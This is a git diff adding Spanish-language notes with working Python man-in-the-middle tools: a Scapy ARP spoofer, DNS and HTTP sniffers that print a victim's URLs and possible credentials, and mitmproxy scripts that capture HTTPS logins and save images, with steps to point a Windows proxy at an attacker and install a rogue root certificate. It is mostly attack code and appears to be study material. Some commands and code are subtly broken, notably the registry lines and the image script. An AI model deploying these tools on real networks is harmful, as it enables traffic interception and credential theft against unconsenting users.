@@ -238,3 +238,221 @@ if __name__ == '__main__':
     main()
 ```
 
+## Envenenador ARP (ARP Spoofer) con Scapy
+
+```python
+#!/usr/bin/env python3
+import argparse
+import time
+import sys
+import scapy.all as scapy
+import signal # para manejar señales de teclado
+from termcolor import colored # para poner colores en la terminal
+
+# Con este script puedes ejecutar un MiTM colocándote entre el router y la máquina víctima
+
+def def_handler(sig, frame): # para cuando se para la ejecución de forma brusca
+    print(colored(f"\n[!] Saliendo del programa...", 'red'))
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler) # Ctrl+C
+
+def get_arguments():
+    parser = argparse.ArgumentParser(description="ARP Spoofer")
+    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP Range to spoof")
+
+    return parser.parse_args()
+
+def spoof(ip_address, spoof_ip):
+    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66") # si pones 2 estás enviando una respuesta que no ha sido solicitada
+    scapy.send(arp_packet, verbose=False) # no quiero recibir nada, solo tramitar el paquete concreto a su destino, por eso se usa send()
+
+def main():
+    arguments = get_arguments()
+
+    while True: # hay que hacerlo continuamente porque en la red los dispositivos se comunican constantemente
+        spoof(arguments.ip_address, "192.168.1.1") # la que se le envía a la máquina víctima
+        spoof("192.168.1.1", arguments.ip_address) # la que se le envía al router haciéndose pasar por la máquina víctima
+        time.sleep(2)
+
+if __name__ == '__main__':
+    main()
+```
+
+## Rastreador de consultas DNS (DNS Sniffer) con Scapy
+
+- Combinarlo con el `arps_poofer.py` para interceptar el tráfico
+
+```python
+#!/usr/bin/env python3
+
+import scapy.all as scapy
+
+def process_dns_packet(packet):
+    if packet.haslayer(scapy.DNSQR): # filtra por paquetes que contengas la capa DNSQR
+        #print(packet.show())
+        domain = packet[scapy.DNSQR].qname.decode()
+        exclude_keywords = ["google", "cloudflare", "bing", "static"] # blacklist
+
+        if domain not in domains_seen and not any(keyword in domain for keyword in exclude_keywords): 
+            domains_seen.add(domain)
+            
+            print(f"[+] Dominio: {domain}")
+
+def sniff(interface):
+    print(f"\n[+] Interceptando paquetes de la máquina víctima\n")
+    scapy.sniff(iface=interface, filter="udp and port 53", prn=process_dns_packet, store=0)
+
+def main():
+    sniff("ens33") # le pasas la interfaz de red a sniff
+
+if __name__ == '__main__':
+    global domains_seen
+    domains_seen = set()
+
+    main()
+```
+
+## Rastreador de consultas HTTP (HTTP sniffer) con Scapy
+
+```python
+#!/usr/bin/env python3
+
+import scapy.all as scapy
+from scapy.layers import http
+from termcolor import colored
+import signal # para manejar señales de teclado
+import sys
+
+def def_handler(sig, frame): # para cuando se para la ejecución de forma brusca
+    print(colored(f"\n[!] Saliendo del programa...\n", 'red'))
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler) # Ctrl+C
+
+def process_packet(packet):
+    cred_keywords = ["login", "user", "pass", "mail"]
+
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
+            print(colored(f"[+] URL visitada por la víctima: {url}", 'blue'))
+            try:
+                response = packet[scapy.Raw].load.decode()
+
+                for keyword in cred_keywords:
+                    if keyword in response:
+                        print(colored(f"\n[+] Posibles credenciales: {response}", 'green'))
+                        break
+            except:
+                pass
+
+def sniff(interface):
+    scapy.sniff(iface=interface, prn=process_packet, store=0)
+
+def main():
+    sniff("ens33") # le pasas la interfaz de red a sniff
+
+if __name__ == '__main__':
+
+    main()
+```
+
+## Rastreador de consultas HTTPS (HTTPS Sniffer) con mitmdump
+
+- Instálalo:
+
+```shell
+mkdir MITM && cd MITM
+wget mitmproxy-xxx.tar.gz
+tar -xf mitmproxy-xxx.tar.gz && rm mitmproxy-xxx.tar.gz 
+```
+
+1. **Máquina víctima**
+
+- Ejecuta el binario: `./mitweb` en la máquina atacante
+- Configurar el proxy (Windows):
+
+```cmd
+add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_DWORD /d 1 /f
+
+add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "IP_ATACANTE_PROXY:PUERTO" /f
+```
+
+> Para eliminar el proxy:
+
+```cmd
+add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_DWORD /d 0 /f
+
+del "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "IP_ATACANTE_PROXY:PUERTO" /f
+```
+
+- Visita [mitm.it](http://mitm.it) e instala el certificado.
+	- Coloca el certificado en "Entidades de certificación raíz de confianza"
+	- Borra el certificado de las descargas y vacía la papelera
+- Para el binario `mitweb`
+
+2. **Máquina atacante**
+
+- Ejecuta el binario: `./mitmproxy`
+
+```python
+#!/usr/bin/env python3
+from mitmproxy import http
+from mitmproxy import ctx
+from urllib.parse import urlparse
+
+def has_keywords(data, keywords):
+    return any(keyword in data for keyword in keywords)
+
+def request(packet):
+    #ctx.log.info(f"[+] URL: {packet.request.url}")
+    url = packet.request.url
+    url_parsed = urlparse(url)
+    scheme = url_parsed.scheme
+    domain = url_parsed.netloc
+    path = url_parsed.path
+
+    print(f"[+] URL visitada por la víctima: {scheme}.//{domain}{path}")
+
+    keywords = ["user", "pass"]
+    data = packet.request.get_text()
+
+    if has_keywords(data, keywords):
+        print(f"\[+] Posibles credenciales capturadas:\n{data}\n")
+```
+
+> [!Note]
+> Para ejecutar el script: `./mitmdump -s https_sniffer.py`
+
+## Rastreador de imágenes por HTTPS (HTTPS Image Sniffer) con mitmdump
+
+```python
+#!/usr/bin/env python3
+
+from mitmproxy import http
+
+def response(packet):
+    content_type = print(packet.response.headers.get("content-type", "-")) # para los que no tienen un valor (None)
+
+    try:
+        if "image" in content_type:
+            url = packet.request.url
+            extension = content_type.split("/")[-1]
+            
+            if extension == "jpeg": # para evitar errores de previsualización de jpeg
+                extension = "jpg" 
+
+            file_name = f"images/{url.replace('/', '_').replace(':', '_')}.{extension}"
+            image_data = packet.response.content
+
+            with open(file_name, "wb") as f:
+                f.write(image_data)
+
+            print(f"[+] Imagen guardada: {file_name}")
+    except:
+        pass
+```
+
+- Ejecutar con `mitmdump -s https_image_sniffer.py --quiet`
+
